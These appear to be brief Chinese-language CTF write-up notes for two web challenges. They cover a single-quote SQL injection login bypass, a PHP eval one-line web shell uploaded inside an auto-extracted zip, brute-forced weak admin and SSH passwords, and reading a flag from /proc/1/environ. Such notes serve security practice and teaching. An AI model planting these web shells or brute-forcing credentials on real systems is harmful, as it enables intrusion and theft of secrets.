## Web

### firmware-update-system-web（单引号 SQLi + zip 上传）

```php
// 单引号报错 SQLi 绕登录
// 后台文件上传压缩包 → 自动解压
<?php eval($_POST['cmd']);   // 报错
<?=eval($_POST['cmd']);     // 简化短标签 OK
// 1.php 压缩成 zip 上传 → 解压到 webroot → 连 shell
```

### 车辆管理系统渗透

- 后台管理员：`admin / ihateyou` 爆破
- SSH 弱密码：`test / iloveyou`（常见用户名 test/ubuntu/root/guest 字典爆破）
- flag 在**环境变量**（`env` 或 `/proc/1/environ`）
